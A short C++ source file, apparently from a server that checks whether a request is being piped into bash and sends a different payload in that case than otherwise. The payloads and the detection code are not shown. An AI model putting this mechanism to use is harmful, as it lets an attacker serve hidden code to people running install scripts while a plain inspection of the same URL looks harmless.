#include <cstdlib>
#include <iostream>
#include <string>
#include <boost/bind.hpp>
#include <boost/smart_ptr.hpp>
#include <boost/asio.hpp>
#include <boost/thread/thread.hpp>

#include "session.hpp"


void Session::handleConnection () {
    if (this->isPipedToBash()) {
        std::cout << "Request -> piped to bash" << std::endl;
        boost::asio::write(*socket, boost::asio::buffer(this->pipe_payload));
    } else {
        std::cout << "Request -> not piped to bash" << std::endl;
        boost::asio::write(*socket, boost::asio::buffer(this->non_pipe_payload));
    }

    // Temporary magic
    // - Need to set proper headers to prevent (56) Recv failure on client
    sleep(2);

    // Gracefully close the connection
    (*socket).shutdown(boost::asio::ip::tcp::socket::shutdown_both);
}
